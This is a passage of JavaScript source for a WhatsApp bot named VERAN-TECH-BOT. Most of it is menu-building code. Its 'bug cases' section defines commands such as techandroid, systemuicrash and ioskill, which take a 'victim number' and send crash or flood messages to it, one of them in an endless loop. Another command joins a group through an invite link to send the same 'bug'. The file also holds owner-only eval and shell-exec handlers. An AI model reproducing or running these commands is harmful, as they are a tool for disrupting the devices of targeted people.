                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'othermenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Other* 」❍
│${setv} ${prefix}*update√*
│${setv} ${prefix}*cricket√*
│${setv} ${prefix}*score√*
│${setv} ${prefix}*ping√*
│${setv} ${prefix}*menu√*
│${setv} ${prefix}*myip√*
│${setv} ${prefix}*repo√*
│${setv} ${prefix}*reportbug√*
│${setv} ${prefix}*idgroup√*
│${setv} ${prefix}*owner√*
│${setv} ${prefix}*rentbot√*
│${setv} ${prefix}*donate√*
│${setv} ${prefix}*runtime√*
│${setv} ${prefix}*confess√*
│${setv} ${prefix}*react√*
│${setv} ${prefix}*q√*
│${setv} ${prefix}*inspect√*
│${setv} ${prefix}*tagme√*
│${setv} ${prefix}*nowa√*
│${setv} ${prefix}*truecaller√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/y0nLDSB/veran-IMG.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/y0nLDSB/veran-IMG.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
               
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break

 //bug cases
case 'techandroid': {
  if (!VeranTheCreator) return
  if (!text) return replygcveran(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcveran(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcveran("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VeranBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "234xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcveran("The number is not registered on WhatsApp");
  }
  replygcveran("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n*Hey this is VERAN-TECH-BOT please Pause 2 minutes so that the bot is not banned.*", 
    [whatsappNumber]
  );
}
break;
case 'techios': {
  if (!VeranTheCreator) return
  if (!text) return replygcveran(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcveran(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcveran("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VeranBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "234xxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcveran("The number is not registered on WhatsApp");
  }
  replygcveran("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'techios2':
  {
	if (!VeranTheCreator) return
    if (!isBot) {
      return replygcveran("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcveran(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcveran("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcveran("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case 'techandroid2': {
	if (!VeranTheCreator) return
    if (!isBot) {
      return replygcveran("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcveran(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcveran("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcveran("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case 'xgc':
  {
    if (!VeranTheCreator) return
    if (!text) {
      return replygcveran("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygcveran("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygcveran("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await VeranBotInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygcveran("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      VeranBotInc.groupLeave(groupTarget);
    } catch (error) {
      replygcveran(util.format(error));
    }
  }
  break;
  case 'darlingkill':
  {
	if (!VeranTheCreator) return
    if (!isBot) {
      return replygcveran("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcveran(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcveran("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcveran("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case 'systemuicrash': {
  if (!VeranTheCreator) return
  if (!text) return replygcveran(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcveran(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcveran("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VeranBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "234xxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcveran("The number is not registered on WhatsApp");
  }
  replygcveran("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nHey this is VERAN-TECH-BOT please Pause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'techsysui': {
  if (!VeranTheCreator) return
  if (!text) return replygcveran(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcveran(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcveran("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VeranBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "234xxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcveran("The number is not registered on WhatsApp");
  }
  replygcveran("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nHey this is VERAN-TECH-BOT please Pause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'ioskill': case 'iosx': {
            	if (!VeranTheCreator) return
let veranyvictim = q.replace(/[^0-9]/g, "")
if (veranyvictim.startsWith('0')) return replygcveran(`Example : .${command} 234xxxxxxx`)
await replygcveran(`In process....`)
let target = veranyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!VeranTheCreator) return
if (!q) return replygcveran(`Usage .${command} 234xxxxxxxxx`)
let veranyvictim = q.replace(/[^0-9]/g, "")
if (veranyvictim.startsWith('0')) return replygcveran(`Example : .${command} 234xxxxxxxxx`)
let target = veranyvictim + '@s.whatsapp.net'
await replygcveran(`In process....`)
for (let j = 0; j < 1; j++) {
await listveranfck(target, oneclickveran)
await locationverany(target, force)
await verankillpic(target, oneclickveran)
await locationverany(target, force)
await blackening(target, force2)
await locationverany(target, force)
}
await replygcveran(`Successfully Send Bug to ${veranyvictim} Using ${command}. ✅`)
}
break
                //alive
                case "alive": case "veran": case "v": case "vth": case 'vtb':

const audiovn = "./VTHalive.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "Is VERAN-TECH-BOT ᥲᥣі᥎ᥱ? 🤭",
          body: "VERAN-TECH-BOT іs ᥲᥣі᥎ᥱ",
          thumbnailUrl: "https://i.imgur.com/b15GFdJ.jpeg",
          sourceUrl: "https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


await VeranBotInc.sendMessage(m.chat, dooc, {quoted: m});


break;

			default:
			if (budy.startsWith('>')) {
				if (!VeranTheCreator) return
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await replygcveran(evaled)
				} catch (err) {
					await replygcveran(String(err))
				}
			}
			if (budy.startsWith('<')) {
				if (!VeranTheCreator) return
				try {
					let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await replygcveran(evaled)
				} catch (err) {
					await replygcveran(String(err))
				}
			}
			if (budy.startsWith('$')) {
				if (!VeranTheCreator) return
				if (!text) return
				exec(budy.slice(2), (err, stdout) => {
					if (err) return replygcveran(`${err}`)
					if (stdout) return replygcveran(stdout)
				})
			}
			if (m.message && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
VeranBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
		}
	} catch (err) {
		console.log(util.format(err))
        let e = String(err)
VeranBotInc.sendMessage("2347082664317@s.whatsapp.net", { text: "🌹 Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 3, 
isForwarded: true
}})
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
